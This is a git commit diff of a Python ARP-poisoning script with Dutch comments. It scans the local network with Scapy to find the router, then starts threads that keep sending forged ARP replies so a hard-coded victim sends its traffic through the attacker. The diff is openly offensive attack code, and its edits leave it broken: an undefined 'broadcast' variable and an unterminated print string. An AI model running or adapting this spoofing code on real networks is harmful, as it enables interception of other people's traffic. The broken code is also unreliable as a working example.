9eb77d96d359c4beddee2fcc7de10bcf3eb0cf0b
kobedens <kobe.dens@hotmail.com>
2024-11-04 17:10:35 +0100

    ARPpoisoning.py

--- ARPpoisoning.py
+++ ARPpoisoning.py
@@ -16,17 +16,21 @@ def get_local_ip_and_subnet():
 
 def get_ip_and_mac():
     local_ip = get_local_ip_and_subnet()
-    subnet = '.'.join(local_ip.split('.')[:-1]) + '.1/24' #deze lijn doet een ARP scan over het hele lokale netwerk
+    subnet = '.'.join(local_ip.split('.')[:-1]) + '.1/24' #deze lijn bepaalt over welk netwerk we de scan willen doen; hier: het HELE ('.1/24') lokale netwerk waar we zelf op zitten (en dus eerst op zijn ingebroken)
 
-    arp_request = ARP(pdst=subnet)
-    ether = Ether(dst='ff:ff:ff:ff:ff:ff')
-    packet = ether / arp_request
+    arp_request = ARP(pdst=subnet)  #dit scant voor target IP adressen
+    ethernet_frame = Ether(dst='ff:ff:ff:ff:ff:ff') #maakt een ethernet frame met als destination het 'broadcast adress' (='ff:ff:ff:ff:ff:ff'), dit is een speciaal MAC adres waar ALLE devices op een netwerk naar luisteren
+    packet = broadcast / arp_request #combineert het frame met de request
 
-    result = srp(packet, timeout=3, verbose=False)[0]
+    answers_list = srp(packet, timeout=3, verbose=False)[0] #srp --> Send and Receive Packets
+    result=[]
 
-    for sent, received in result: #loop over alle ontvangen packets
-        if received.psrc != local_ip:  # deze lijn zorgt ervoor dat de packets die van zichzelf komen genegeerd worden
-            return received.psrc, received.hwsrc #psrc = protocol source (= IP adres); hwsrc = hardware source (=MAC adres)
+    print("IP\t
+    for element in answers_list: #loop over alle packets met antwoorden; 'element' is dan een lijst met eerst de verzonden info, dan de ontvangen antwoorden
+        if element[1].psrc != local_ip:  # deze lijn zorgt ervoor dat de packets die van ons eigen device komen genegeerd worden (.psrc neemt het IP adress van waar de data komt)
+            
+            
+            return element[1].psrc, element[1].hwsrc #psrc = protocol source (= IP adres); hwsrc = hardware source (=MAC adres) (van de potentiële targets)
     
     print("Failed, not connected")
     return None, None
@@ -34,9 +38,9 @@ def get_ip_and_mac():
 # Settings for ARP poisoning
 victim_ip = "192.168.1.100"  # IP address of the victim
 victim_mac = "00:0c:29:68:22:51"  # MAC address of the victim (make sure to set this correctly)
-router_ip, router_mac = get_ip_and_mac()
+router_ip, router_mac = get_ip_and_mac() #
 
-try:
+try: #'try' zorgt ervoor dat dit onderbroken kan worden (met een KeyboardInterrupt)
     print("Starting ARP poisoning...")
     # Start poisoning threads
     threading.Thread(target=arp_poison, args=(victim_ip, victim_mac, router_ip)).start() #deze thread stuurt constant ARP packets naar de victim's device waarin staat dat het MAC adres van de attacker bij de IP van de router hoort
